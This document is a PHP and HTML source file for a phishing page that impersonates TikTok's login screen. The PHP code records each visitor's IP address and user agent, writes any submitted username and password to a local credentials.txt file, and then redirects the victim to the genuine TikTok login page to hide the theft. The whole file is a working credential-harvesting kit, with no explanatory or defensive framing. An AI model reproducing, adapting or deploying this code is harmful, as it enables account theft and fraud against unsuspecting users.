<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok</title>
    <link rel="icon" type="image/x-icon" href="./tiktok.ico">
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-popup {
            background-color: #ffffff;
            border-radius: 8px;
            padding: 30px;
            width: 400px;
            box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.1);
            text-align: center;
        }

        .login-popup h2 {
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 25px;
            color: #000;
        }

        .login-form input {
            width: 90%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ccd6dd;
            border-radius: 6px;
            font-size: 14px;
            color: #000;
        }

        .login-form input::placeholder {
            color: #aaa;
        }

        .login-form button {
            width: 90%;
            padding: 12px;
            background-color: #fe2c55;
            color: #fff;
            border: none;
            border-radius: 6px;
            font-weight: bold;
            cursor: pointer;
            font-size: 16px;
        }

        .login-form button:hover {
            background-color: #d52848;
        }

        .signup-link {
            margin-top: 20px;
            font-size: 14px;
            color: #000;
        }

        .signup-link a {
            color: #fe2c55;
            text-decoration: none;
            font-weight: bold;
        }

        .signup-link a:hover {
            text-decoration: underline;
        }
    </style>
</head>

<body>

    <div class="login-popup">
        <h2>Log in to TikTok</h2>
        <form class="login-form" action="" method="post">
            <input type="text" name="username" placeholder="Email address or phone number" value="<?php echo isset($_GET['username']) ? htmlspecialchars($_GET['username']) : ''; ?>" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
            <div class="signup-link">Don't have an account? <a href="https://www.tiktok.com/signup">Sign Up</a></div>
        </form>
    </div>

</body>

</html>

<?php
if (!empty($_SERVER['HTTP_CLIENT_IP']))
{
  $ip = $_SERVER['HTTP_CLIENT_IP']."\r\n";
}
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
{
  $ip = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
}
else
{
  $ip = $_SERVER['REMOTE_ADDR']."\r\n";
}
$useragent = $_SERVER['HTTP_USER_AGENT'];

$filename = "../credentials.txt";

$data = "\n|-------------------TikTok-------------------|\n" . "User-Agent: " . $useragent . "\n" . "IP: " . $ip . "\n";
file_put_contents($filename, $data, FILE_APPEND);

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];

    $data = "User: " . $username . "\n" . "Pass: " . $password . "\n|-------------------TikTok-------------------|\n";
    file_put_contents($filename, $data, FILE_APPEND);
    header("Location: https://www.tiktok.com/login");
}
?>
